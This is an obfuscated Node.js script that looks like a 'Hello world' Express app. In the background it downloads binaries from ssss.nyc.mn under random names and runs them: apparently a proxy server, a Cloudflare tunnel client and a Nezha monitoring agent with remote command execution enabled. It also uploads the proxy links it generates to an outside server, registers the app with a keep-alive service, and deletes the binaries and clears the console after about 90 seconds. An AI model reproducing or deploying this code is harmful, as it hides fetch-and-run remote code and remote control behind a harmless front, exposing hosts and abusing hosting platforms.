const _0x27288b=_0x560d;(function(_0x71adbd,_0x3f35d2){const _0x1552ae=_0x560d,_0xbbe96c=_0x71adbd();while(!![]){try{const _0x4635c4=-parseInt(_0x1552ae(0x13c))/0x1+parseInt(_0x1552ae(0x190))/0x2*(-parseInt(_0x1552ae(0x11f))/0x3)+-parseInt(_0x1552ae(0x18e))/0x4*(-parseInt(_0x1552ae(0x149))/0x5)+parseInt(_0x1552ae(0x18c))/0x6*(-parseInt(_0x1552ae(0x1a1))/0x7)+parseInt(_0x1552ae(0x147))/0x8*(-parseInt(_0x1552ae(0x15d))/0x9)+-parseInt(_0x1552ae(0x15f))/0xa+parseInt(_0x1552ae(0x11a))/0xb*(parseInt(_0x1552ae(0x179))/0xc);if(_0x4635c4===_0x3f35d2)break;else _0xbbe96c['push'](_0xbbe96c['shift']());}catch(_0x4b9dbb){_0xbbe96c['push'](_0xbbe96c['shift']());}}}(_0x24b7,0xdd607));const express=require(_0x27288b(0x1b3)),app=express(),axios=require(_0x27288b(0x165)),os=require('os'),fs=require('fs'),path=require(_0x27288b(0x122)),{promisify}=require(_0x27288b(0x151)),exec=promisify(require('child_process')['exec']),{execSync}=require(_0x27288b(0x193)),UPLOAD_URL=process[_0x27288b(0x18d)]['UPLOAD_URL']||'',PROJECT_URL=process[_0x27288b(0x18d)]['PROJECT_URL']||'',AUTO_ACCESS=process['env'][_0x27288b(0x1b2)]||![],FILE_PATH=process[_0x27288b(0x18d)]['FILE_PATH']||_0x27288b(0x140),SUB_PATH=process[_0x27288b(0x18d)][_0x27288b(0xf4)]||_0x27288b(0x10f),PORT=process[_0x27288b(0x18d)][_0x27288b(0xfa)]||process['env'][_0x27288b(0x15c)]||0xbb8,UUID=process[_0x27288b(0x18d)][_0x27288b(0x17a)]||_0x27288b(0x1a9),NEZHA_SERVER=process[_0x27288b(0x18d)][_0x27288b(0xfe)]||'',NEZHA_PORT=process[_0x27288b(0x18d)][_0x27288b(0x131)]||'',NEZHA_KEY=process['env'][_0x27288b(0x189)]||'',ARGO_DOMAIN=process[_0x27288b(0x18d)]['ARGO_DOMAIN']||'',ARGO_AUTH=process[_0x27288b(0x18d)][_0x27288b(0x12c)]||'',ARGO_PORT=process[_0x27288b(0x18d)]['ARGO_PORT']||0x1f41,CFIP=process['env']['CFIP']||_0x27288b(0x16b),CFPORT=process[_0x27288b(0x18d)][_0x27288b(0x1ae)]||0x1bb,NAME=process[_0x27288b(0x18d)][_0x27288b(0x102)]||'';!fs[_0x27288b(0xfd)](FILE_PATH)?(fs[_0x27288b(0x10a)](FILE_PATH),console[_0x27288b(0x160)](FILE_PATH+'\x20is\x20created')):console['log'](FILE_PATH+_0x27288b(0x12e));function generateRandomName(){const _0x48c77c=_0x27288b,_0x5c66f9='abcdefghijklmnopqrstuvwxyz';let _0x529f60='';for(let _0x10ac42=0x0;_0x10ac42<0x6;_0x10ac42++){_0x529f60+=_0x5c66f9[_0x48c77c(0x15b)](Math[_0x48c77c(0xf9)](Math[_0x48c77c(0x17f)]()*_0x5c66f9[_0x48c77c(0x186)]));}return _0x529f60;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x27288b(0x174)](FILE_PATH,npmName),phpPath=path[_0x27288b(0x174)](FILE_PATH,phpName),webPath=path['join'](FILE_PATH,webName),botPath=path['join'](FILE_PATH,botName),subPath=path[_0x27288b(0x174)](FILE_PATH,_0x27288b(0x117)),listPath=path[_0x27288b(0x174)](FILE_PATH,'list.txt'),bootLogPath=path[_0x27288b(0x174)](FILE_PATH,_0x27288b(0x14d)),configPath=path[_0x27288b(0x174)](FILE_PATH,_0x27288b(0x1b1));function deleteNodes(){const _0x3ae08c=_0x27288b;try{if(!UPLOAD_URL)return;if(!fs[_0x3ae08c(0xfd)](subPath))return;let _0x220d06;try{_0x220d06=fs[_0x3ae08c(0x185)](subPath,_0x3ae08c(0x18a));}catch{return null;}const _0x4611ba=Buffer[_0x3ae08c(0x12b)](_0x220d06,_0x3ae08c(0x130))[_0x3ae08c(0x163)](_0x3ae08c(0x18a)),_0x3bc543=_0x4611ba[_0x3ae08c(0x1aa)]('\x0a')['filter'](_0x3dd3f8=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x3ae08c(0x10e)](_0x3dd3f8));if(_0x3bc543[_0x3ae08c(0x186)]===0x0)return;return axios[_0x3ae08c(0x153)](UPLOAD_URL+_0x3ae08c(0xfc),JSON[_0x3ae08c(0x180)]({'nodes':_0x3bc543}),{'headers':{'Content-Type':_0x3ae08c(0x19f)}})[_0x3ae08c(0x1a2)](_0x7bc877=>{return null;}),null;}catch(_0x164a3d){return null;}}function cleanupOldFiles(){const _0x5e456a=_0x27288b;try{const _0x2f957a=fs[_0x5e456a(0xf3)](FILE_PATH);_0x2f957a['forEach'](_0x1723e3=>{const _0x40ecae=_0x5e456a,_0x462d7d=path[_0x40ecae(0x174)](FILE_PATH,_0x1723e3);try{const _0x21a92d=fs[_0x40ecae(0x1a5)](_0x462d7d);_0x21a92d[_0x40ecae(0x1af)]()&&fs[_0x40ecae(0xef)](_0x462d7d);}catch(_0x25fb66){}});}catch(_0x439480){}}app[_0x27288b(0x16e)]('/',function(_0x4bfcb3,_0x3ea5d8){const _0x274734=_0x27288b;_0x3ea5d8[_0x274734(0x135)](_0x274734(0x172));});async function generateConfig(){const _0x3dc4c5=_0x27288b,_0x81e60b={'log':{'access':'/dev/null','error':'/dev/null','loglevel':_0x3dc4c5(0x13f)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x3dc4c5(0x138),'settings':{'clients':[{'id':UUID,'flow':_0x3dc4c5(0x152)}],'decryption':_0x3dc4c5(0x13f),'fallbacks':[{'dest':0xbb9},{'path':'/vless-argo','dest':0xbba},{'path':_0x3dc4c5(0x110),'dest':0xbbb},{'path':_0x3dc4c5(0x121),'dest':0xbbc}]},'streamSettings':{'network':_0x3dc4c5(0x13e)}},{'port':0xbb9,'listen':_0x3dc4c5(0x164),'protocol':_0x3dc4c5(0x138),'settings':{'clients':[{'id':UUID}],'decryption':_0x3dc4c5(0x13f)},'streamSettings':{'network':'tcp','security':_0x3dc4c5(0x13f)}},{'port':0xbba,'listen':'127.0.0.1','protocol':_0x3dc4c5(0x138),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x3dc4c5(0x13f)},'streamSettings':{'network':'ws','security':_0x3dc4c5(0x13f),'wsSettings':{'path':_0x3dc4c5(0x19e)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x3dc4c5(0x150),'quic'],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x3dc4c5(0x164),'protocol':_0x3dc4c5(0x166),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x3dc4c5(0x110)}},'sniffing':{'enabled':!![],'destOverride':[_0x3dc4c5(0xf6),_0x3dc4c5(0x150),'quic'],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x3dc4c5(0x164),'protocol':_0x3dc4c5(0x115),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x3dc4c5(0x13f),'wsSettings':{'path':_0x3dc4c5(0x121)}},'sniffing':{'enabled':!![],'destOverride':[_0x3dc4c5(0xf6),_0x3dc4c5(0x150),_0x3dc4c5(0x191)],'metadataOnly':![]}}],'dns':{'servers':[_0x3dc4c5(0x162)]},'outbounds':[{'protocol':_0x3dc4c5(0xf1),'tag':_0x3dc4c5(0x1a3)},{'protocol':'blackhole','tag':_0x3dc4c5(0x13a)}]};fs[_0x3dc4c5(0x123)](path['join'](FILE_PATH,'config.json'),JSON[_0x3dc4c5(0x180)](_0x81e60b,null,0x2));}function _0x560d(_0x3d9a42,_0x3c82a8){_0x3d9a42=_0x3d9a42-0xef;const _0x24b721=_0x24b7();let _0x560d40=_0x24b721[_0x3d9a42];return _0x560d40;}function _0x24b7(){const _0x50869b=['platform','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','Empowerment\x20success\x20for\x20','CFPORT','isFile','\x0a\x20\x20credentials-file:\x20','config.json','AUTO_ACCESS','express','unlinkSync','App\x20is\x20running','freedom','Error\x20executing\x20command:\x20','readdirSync','SUB_PATH','text/plain;\x20charset=utf-8','http','\x20-s\x20','https://arm64.ssss.nyc.mn/v1','floor','SERVER_PORT','true','/api/delete-nodes','existsSync','NEZHA_SERVER','2083','success','?security=tls&sni=','NAME','2053','then','ArgoDomain:','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','https://arm64.ssss.nyc.mn/bot','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','fileUrl','mkdirSync','2087','substring','php\x20running\x20error:\x20','test','sub','/vmess-argo','countryCode','org','&path=%2Ftrojan-argo%3Fed%3D2560#','del\x20/f\x20/q\x20','trojan','pop','sub.txt','basename','set','9885403HWrfYA','createWriteStream','&fp=firefox&type=ws&host=','clear','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','2841kWwfvi','NEZHA\x20variable\x20is\x20empty,skip\x20running','/trojan-argo','path','writeFileSync','Add\x20automatic\x20access\x20task\x20faild:\x20','/tunnel.yml\x20run','/vmess-argo?ed=2560','filter','\x20successfully','arch','Error\x20reading\x20boot.log:','from','ARGO_AUTH','pkill\x20-f\x20\x22[','\x20already\x20exists','fileName','base64','NEZHA_PORT','match','--tls','\x20is\x20running','send','/sub.txt\x20saved\x20successfully','listen','vless','Skipping\x20adding\x20automatic\x20access\x20task','block','has','740899gnZknP','Error\x20downloading\x20files:','tcp','none','./tmp','2096','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','\x20-c\x20','Download\x20','Empowerment\x20failed\x20for\x20','\x0a\x0avmess://','8fHHetV','arm64','5coxoKZ','response','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','\x20-c\x20\x22','boot.log','8443','/api/add-nodes','tls','util','xtls-rprx-vision','post','nohup\x20','status','push','taskkill\x20/f\x20/im\x20','message','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','\x20failed:\x20','charAt','PORT','13639743BrXTpg','Subscription\x20uploaded\x20successfully','14453180VqcAtS','log','https://amd64.ssss.nyc.mn/v1','https+local://8.8.8.8/dns-query','toString','127.0.0.1','axios','vmess','data','Unhandled\x20error\x20in\x20startserver:','ARGO_DOMAIN:','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','cdns.doon.eu.org','\x0a\x20\x20tunnel:\x20','https://amd64.ssss.nyc.mn/agent','get','error','chmod','unlink','Hello\x20world!','http://ip-api.com/json/','join','https://ipapi.co/json/','unshift','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','Nodes\x20uploaded\x20successfully','72UQRzpz','UUID','\x0avless://','443','country_code','map','random','stringify','\x20-p\x20','npm\x20running\x20error:\x20','/api/add-subscriptions','\x20>/dev/null\x202>&1\x20&','readFileSync','length','rm\x20-rf\x20','Error\x20in\x20startserver:','NEZHA_KEY','utf-8','arm','7326174LihLKS','env','2587124gOAoJk','TunnelSecret','442jKxhWq','quic','http\x20server\x20is\x20running\x20on\x20port:','child_process','web\x20running\x20error:\x20','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','false','includes','https://amd64.ssss.nyc.mn/bot','forEach','\x0a\x0atrojan://','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','win32','aarch64','/vless-argo','application/json','\x20>/dev/null\x202>&1','7coLMdp','catch','direct','pipe','statSync','tunnel.json','finish','https://arm64.ssss.nyc.mn/agent','f6d9844c-f588-4147-bb1a-09116c8c0c29','split'];_0x24b7=function(){return _0x50869b;};return _0x24b7();}function getSystemArchitecture(){const _0x5c6916=_0x27288b,_0x5d8c41=os[_0x5c6916(0x129)]();return _0x5d8c41===_0x5c6916(0x18b)||_0x5d8c41===_0x5c6916(0x148)||_0x5d8c41===_0x5c6916(0x19d)?_0x5c6916(0x18b):'amd';}function downloadFile(_0x34cff4,_0x350243,_0x2f0f52){const _0x540822=_0x27288b,_0x58e9df=_0x34cff4;!fs[_0x540822(0xfd)](FILE_PATH)&&fs[_0x540822(0x10a)](FILE_PATH,{'recursive':!![]});const _0x34f32a=fs[_0x540822(0x11b)](_0x58e9df);axios({'method':_0x540822(0x16e),'url':_0x350243,'responseType':'stream'})[_0x540822(0x104)](_0x1a12be=>{const _0xfe827f=_0x540822;_0x1a12be[_0xfe827f(0x167)][_0xfe827f(0x1a4)](_0x34f32a),_0x34f32a['on'](_0xfe827f(0x1a7),()=>{const _0x254afe=_0xfe827f;_0x34f32a['close'](),console['log'](_0x254afe(0x144)+path[_0x254afe(0x118)](_0x58e9df)+_0x254afe(0x128)),_0x2f0f52(null,_0x58e9df);}),_0x34f32a['on'](_0xfe827f(0x16f),_0x14400b=>{const _0x15ad0a=_0xfe827f;fs[_0x15ad0a(0x171)](_0x58e9df,()=>{});const _0x4f4964=_0x15ad0a(0x144)+path[_0x15ad0a(0x118)](_0x58e9df)+_0x15ad0a(0x15a)+_0x14400b[_0x15ad0a(0x158)];console['error'](_0x4f4964),_0x2f0f52(_0x4f4964);});})[_0x540822(0x1a2)](_0x25172b=>{const _0x5d8a66=_0x540822,_0x50aada=_0x5d8a66(0x144)+path['basename'](_0x58e9df)+_0x5d8a66(0x15a)+_0x25172b[_0x5d8a66(0x158)];console[_0x5d8a66(0x16f)](_0x50aada),_0x2f0f52(_0x50aada);});}async function downloadFilesAndRun(){const _0x265ff2=_0x27288b,_0x5866d0=getSystemArchitecture(),_0xedd10c=getFilesForArchitecture(_0x5866d0);if(_0xedd10c[_0x265ff2(0x186)]===0x0){console[_0x265ff2(0x160)]('Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture');return;}const _0x331091=_0xedd10c[_0x265ff2(0x17e)](_0x440efd=>{return new Promise((_0x32337a,_0x5adb55)=>{const _0x3ba0cd=_0x560d;downloadFile(_0x440efd[_0x3ba0cd(0x12f)],_0x440efd[_0x3ba0cd(0x109)],(_0xcbc324,_0x509d8)=>{_0xcbc324?_0x5adb55(_0xcbc324):_0x32337a(_0x509d8);});});});try{await Promise['all'](_0x331091);}catch(_0x3d21ad){console[_0x265ff2(0x16f)](_0x265ff2(0x13d),_0x3d21ad);return;}function _0x2ad3e0(_0x24cdeb){const _0x224819=0x1fd;_0x24cdeb['forEach'](_0xfedf4f=>{const _0xaf810c=_0x560d;fs['existsSync'](_0xfedf4f)&&fs[_0xaf810c(0x170)](_0xfedf4f,_0x224819,_0x20a27e=>{const _0x5a6d87=_0xaf810c;_0x20a27e?console[_0x5a6d87(0x16f)](_0x5a6d87(0x145)+_0xfedf4f+':\x20'+_0x20a27e):console[_0x5a6d87(0x160)](_0x5a6d87(0x1ad)+_0xfedf4f+':\x20'+_0x224819['toString'](0x8));});});}const _0x5ac3a4=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x2ad3e0(_0x5ac3a4);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x37c50f=NEZHA_SERVER['includes'](':')?NEZHA_SERVER[_0x265ff2(0x1aa)](':')[_0x265ff2(0x116)]():'',_0x58adb9=new Set(['443',_0x265ff2(0x14e),_0x265ff2(0x141),'2087',_0x265ff2(0xff),_0x265ff2(0x103)]),_0x3680a3=_0x58adb9[_0x265ff2(0x13b)](_0x37c50f)?_0x265ff2(0xfb):_0x265ff2(0x196),_0x5be78e='\x0aclient_secret:\x20'+NEZHA_KEY+_0x265ff2(0x16a)+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x3680a3+_0x265ff2(0x177)+UUID;fs[_0x265ff2(0x123)](path[_0x265ff2(0x174)](FILE_PATH,'config.yaml'),_0x5be78e);const _0x39225b=_0x265ff2(0x154)+phpPath+_0x265ff2(0x14c)+FILE_PATH+_0x265ff2(0x195);try{await exec(_0x39225b),console[_0x265ff2(0x160)](phpName+_0x265ff2(0x134)),await new Promise(_0xacc34=>setTimeout(_0xacc34,0x3e8));}catch(_0x4515e8){console[_0x265ff2(0x16f)](_0x265ff2(0x10d)+_0x4515e8);}}else{let _0xbe48aa='';const _0x5d2492=[_0x265ff2(0x17c),_0x265ff2(0x14e),_0x265ff2(0x141),_0x265ff2(0x10b),_0x265ff2(0xff),_0x265ff2(0x103)];_0x5d2492[_0x265ff2(0x197)](NEZHA_PORT)&&(_0xbe48aa=_0x265ff2(0x133));const _0x1ed3e2=_0x265ff2(0x154)+npmPath+_0x265ff2(0xf7)+NEZHA_SERVER+':'+NEZHA_PORT+_0x265ff2(0x181)+NEZHA_KEY+'\x20'+_0xbe48aa+_0x265ff2(0x142);try{await exec(_0x1ed3e2),console[_0x265ff2(0x160)](npmName+_0x265ff2(0x134)),await new Promise(_0x1c3af=>setTimeout(_0x1c3af,0x3e8));}catch(_0x1d9722){console['error'](_0x265ff2(0x182)+_0x1d9722);}}}else console[_0x265ff2(0x160)](_0x265ff2(0x120));const _0x5c5a83=_0x265ff2(0x154)+webPath+_0x265ff2(0x143)+FILE_PATH+'/config.json\x20>/dev/null\x202>&1\x20&';try{await exec(_0x5c5a83),console[_0x265ff2(0x160)](webName+'\x20is\x20running'),await new Promise(_0x38802c=>setTimeout(_0x38802c,0x3e8));}catch(_0x5d7990){console[_0x265ff2(0x16f)](_0x265ff2(0x194)+_0x5d7990);}if(fs[_0x265ff2(0xfd)](botPath)){let _0x58beab;if(ARGO_AUTH['match'](/^[A-Z0-9a-z=]{120,250}$/))_0x58beab='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20'+ARGO_AUTH;else ARGO_AUTH[_0x265ff2(0x132)](/TunnelSecret/)?_0x58beab=_0x265ff2(0x14b)+FILE_PATH+_0x265ff2(0x125):_0x58beab='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x265ff2(0x1ac)+ARGO_PORT;try{await exec(_0x265ff2(0x154)+botPath+'\x20'+_0x58beab+_0x265ff2(0x184)),console['log'](botName+_0x265ff2(0x134)),await new Promise(_0x135d64=>setTimeout(_0x135d64,0x7d0));}catch(_0xa44974){console[_0x265ff2(0x16f)](_0x265ff2(0xf2)+_0xa44974);}}await new Promise(_0x3aa5d2=>setTimeout(_0x3aa5d2,0x1388));}function getFilesForArchitecture(_0x5545c2){const _0x29665d=_0x27288b;let _0x1c4c4d;_0x5545c2===_0x29665d(0x18b)?_0x1c4c4d=[{'fileName':webPath,'fileUrl':'https://arm64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':_0x29665d(0x107)}]:_0x1c4c4d=[{'fileName':webPath,'fileUrl':'https://amd64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':_0x29665d(0x198)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x29c0e3=_0x5545c2===_0x29665d(0x18b)?_0x29665d(0x1a8):_0x29665d(0x16d);_0x1c4c4d[_0x29665d(0x176)]({'fileName':npmPath,'fileUrl':_0x29c0e3});}else{const _0x260291=_0x5545c2===_0x29665d(0x18b)?_0x29665d(0xf8):_0x29665d(0x161);_0x1c4c4d[_0x29665d(0x176)]({'fileName':phpPath,'fileUrl':_0x260291});}}return _0x1c4c4d;}function argoType(){const _0x471f53=_0x27288b;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x471f53(0x160)](_0x471f53(0x106));return;}if(ARGO_AUTH[_0x471f53(0x197)](_0x471f53(0x18f))){fs[_0x471f53(0x123)](path[_0x471f53(0x174)](FILE_PATH,_0x471f53(0x1a6)),ARGO_AUTH);const _0x5977ab=_0x471f53(0x16c)+ARGO_AUTH[_0x471f53(0x1aa)]('\x22')[0xb]+_0x471f53(0x1b0)+path[_0x471f53(0x174)](FILE_PATH,_0x471f53(0x1a6))+_0x471f53(0x19b)+ARGO_DOMAIN+'\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:'+ARGO_PORT+_0x471f53(0x159);fs['writeFileSync'](path[_0x471f53(0x174)](FILE_PATH,'tunnel.yml'),_0x5977ab);}else console[_0x471f53(0x160)]('ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel');}async function extractDomains(){const _0x56072a=_0x27288b;let _0x293331;if(ARGO_AUTH&&ARGO_DOMAIN)_0x293331=ARGO_DOMAIN,console['log'](_0x56072a(0x169),_0x293331),await _0x40fc9a(_0x293331);else try{const _0x4902bb=fs[_0x56072a(0x185)](path[_0x56072a(0x174)](FILE_PATH,_0x56072a(0x14d)),_0x56072a(0x18a)),_0xf52067=_0x4902bb[_0x56072a(0x1aa)]('\x0a'),_0x69eb4c=[];_0xf52067[_0x56072a(0x199)](_0x52a869=>{const _0x1ca9fa=_0x56072a,_0x24b437=_0x52a869[_0x1ca9fa(0x132)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x24b437){const _0x58275a=_0x24b437[0x1];_0x69eb4c[_0x1ca9fa(0x156)](_0x58275a);}});if(_0x69eb4c[_0x56072a(0x186)]>0x0)_0x293331=_0x69eb4c[0x0],console[_0x56072a(0x160)](_0x56072a(0x105),_0x293331),await _0x40fc9a(_0x293331);else{console['log']('ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain'),fs[_0x56072a(0xef)](path[_0x56072a(0x174)](FILE_PATH,_0x56072a(0x14d)));async function _0x55764e(){const _0x5daed8=_0x56072a;try{process[_0x5daed8(0x1ab)]===_0x5daed8(0x19c)?await exec(_0x5daed8(0x157)+botName+'.exe\x20>\x20nul\x202>&1'):await exec(_0x5daed8(0x12d)+botName[_0x5daed8(0x15b)](0x0)+']'+botName[_0x5daed8(0x10c)](0x1)+'\x22\x20>\x20/dev/null\x202>&1');}catch(_0x2fd5c7){}}_0x55764e(),await new Promise(_0x53e61c=>setTimeout(_0x53e61c,0xbb8));const _0x229012=_0x56072a(0x108)+FILE_PATH+_0x56072a(0x1ac)+ARGO_PORT;try{await exec(_0x56072a(0x154)+botPath+'\x20'+_0x229012+_0x56072a(0x184)),console[_0x56072a(0x160)](botName+_0x56072a(0x134)),await new Promise(_0x3eae84=>setTimeout(_0x3eae84,0xbb8)),await extractDomains();}catch(_0x4f5d77){console['error'](_0x56072a(0xf2)+_0x4f5d77);}}}catch(_0x358abf){console[_0x56072a(0x16f)](_0x56072a(0x12a),_0x358abf);}async function _0x3ab1f2(){const _0x4a566f=_0x56072a;try{const _0x2d421b=await axios[_0x4a566f(0x16e)](_0x4a566f(0x175),{'timeout':0xbb8});if(_0x2d421b['data']&&_0x2d421b[_0x4a566f(0x167)][_0x4a566f(0x17d)]&&_0x2d421b[_0x4a566f(0x167)][_0x4a566f(0x112)])return _0x2d421b[_0x4a566f(0x167)][_0x4a566f(0x17d)]+'_'+_0x2d421b['data'][_0x4a566f(0x112)];}catch(_0x36fbbe){try{const _0x1ddc9f=await axios[_0x4a566f(0x16e)](_0x4a566f(0x173),{'timeout':0xbb8});if(_0x1ddc9f[_0x4a566f(0x167)]&&_0x1ddc9f['data']['status']===_0x4a566f(0x100)&&_0x1ddc9f['data']['countryCode']&&_0x1ddc9f['data']['org'])return _0x1ddc9f['data'][_0x4a566f(0x111)]+'_'+_0x1ddc9f[_0x4a566f(0x167)]['org'];}catch(_0x412c9b){}}return'Unknown';}async function _0x40fc9a(_0x27a6a9){const _0x4ff482=await _0x3ab1f2(),_0x3c9df1=NAME?NAME+'-'+_0x4ff482:_0x4ff482;return new Promise(_0x5ef375=>{setTimeout(()=>{const _0x2b7e19=_0x560d,_0x31e228={'v':'2','ps':''+_0x3c9df1,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':'none','net':'ws','type':_0x2b7e19(0x13f),'host':_0x27a6a9,'path':_0x2b7e19(0x126),'tls':_0x2b7e19(0x150),'sni':_0x27a6a9,'alpn':'','fp':'firefox'},_0x7ef11d=_0x2b7e19(0x17b)+UUID+'@'+CFIP+':'+CFPORT+'?encryption=none&security=tls&sni='+_0x27a6a9+_0x2b7e19(0x11c)+_0x27a6a9+'&path=%2Fvless-argo%3Fed%3D2560#'+_0x3c9df1+_0x2b7e19(0x146)+Buffer[_0x2b7e19(0x12b)](JSON[_0x2b7e19(0x180)](_0x31e228))[_0x2b7e19(0x163)](_0x2b7e19(0x130))+_0x2b7e19(0x19a)+UUID+'@'+CFIP+':'+CFPORT+_0x2b7e19(0x101)+_0x27a6a9+'&fp=firefox&type=ws&host='+_0x27a6a9+_0x2b7e19(0x113)+_0x3c9df1+'\x0a\x20\x20\x20\x20';console[_0x2b7e19(0x160)](Buffer[_0x2b7e19(0x12b)](_0x7ef11d)[_0x2b7e19(0x163)](_0x2b7e19(0x130))),fs['writeFileSync'](subPath,Buffer['from'](_0x7ef11d)[_0x2b7e19(0x163)](_0x2b7e19(0x130))),console[_0x2b7e19(0x160)](FILE_PATH+_0x2b7e19(0x136)),uploadNodes(),app[_0x2b7e19(0x16e)]('/'+SUB_PATH,(_0x485cae,_0x363ef0)=>{const _0xf56de1=_0x2b7e19,_0x26ebdc=Buffer[_0xf56de1(0x12b)](_0x7ef11d)[_0xf56de1(0x163)](_0xf56de1(0x130));_0x363ef0[_0xf56de1(0x119)]('Content-Type',_0xf56de1(0xf5)),_0x363ef0[_0xf56de1(0x135)](_0x26ebdc);}),_0x5ef375(_0x7ef11d);},0x7d0);});}}async function uploadNodes(){const _0x57bc3c=_0x27288b;if(UPLOAD_URL&&PROJECT_URL){const _0x170e86=PROJECT_URL+'/'+SUB_PATH,_0x555586={'subscription':[_0x170e86]};try{const _0x63d527=await axios[_0x57bc3c(0x153)](UPLOAD_URL+_0x57bc3c(0x183),_0x555586,{'headers':{'Content-Type':_0x57bc3c(0x19f)}});return _0x63d527&&_0x63d527[_0x57bc3c(0x155)]===0xc8?(console[_0x57bc3c(0x160)](_0x57bc3c(0x15e)),_0x63d527):null;}catch(_0x2c5c04){if(_0x2c5c04[_0x57bc3c(0x14a)]){if(_0x2c5c04['response'][_0x57bc3c(0x155)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs['existsSync'](listPath))return;const _0x5e80e2=fs[_0x57bc3c(0x185)](listPath,_0x57bc3c(0x18a)),_0x255c15=_0x5e80e2[_0x57bc3c(0x1aa)]('\x0a')[_0x57bc3c(0x127)](_0x230392=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x57bc3c(0x10e)](_0x230392));if(_0x255c15[_0x57bc3c(0x186)]===0x0)return;const _0x29acab=JSON['stringify']({'nodes':_0x255c15});try{const _0x493352=await axios[_0x57bc3c(0x153)](UPLOAD_URL+_0x57bc3c(0x14f),_0x29acab,{'headers':{'Content-Type':_0x57bc3c(0x19f)}});return _0x493352&&_0x493352[_0x57bc3c(0x155)]===0xc8?(console[_0x57bc3c(0x160)](_0x57bc3c(0x178)),_0x493352):null;}catch(_0xce4482){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x24b9cb=_0x560d,_0x4e78b7=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x4e78b7['push'](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x4e78b7[_0x24b9cb(0x156)](phpPath);process['platform']===_0x24b9cb(0x19c)?exec(_0x24b9cb(0x114)+_0x4e78b7[_0x24b9cb(0x174)]('\x20')+'\x20>\x20nul\x202>&1',_0x5390c3=>{const _0x89a7dd=_0x24b9cb;console[_0x89a7dd(0x11d)](),console[_0x89a7dd(0x160)]('App\x20is\x20running'),console['log'](_0x89a7dd(0x11e));}):exec(_0x24b9cb(0x187)+_0x4e78b7[_0x24b9cb(0x174)]('\x20')+_0x24b9cb(0x1a0),_0x223561=>{const _0x10e4b4=_0x24b9cb;console['clear'](),console['log'](_0x10e4b4(0xf0)),console[_0x10e4b4(0x160)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x1c6dc2=_0x27288b;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x1c6dc2(0x160)](_0x1c6dc2(0x139));return;}try{const _0x37d6ba=await axios[_0x1c6dc2(0x153)]('https://oooo.serv00.net/add-url',{'url':PROJECT_URL},{'headers':{'Content-Type':'application/json'}});return console[_0x1c6dc2(0x160)]('automatic\x20access\x20task\x20added\x20successfully'),_0x37d6ba;}catch(_0x44e610){return console[_0x1c6dc2(0x16f)](_0x1c6dc2(0x124)+_0x44e610[_0x1c6dc2(0x158)]),null;}}async function startserver(){const _0x5e7d47=_0x27288b;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x852377){console['error'](_0x5e7d47(0x188),_0x852377);}}startserver()['catch'](_0x30359a=>{const _0x1c4d5c=_0x27288b;console['error'](_0x1c4d5c(0x168),_0x30359a);}),app[_0x27288b(0x137)](PORT,()=>console[_0x27288b(0x160)](_0x27288b(0x192)+PORT+'!'));
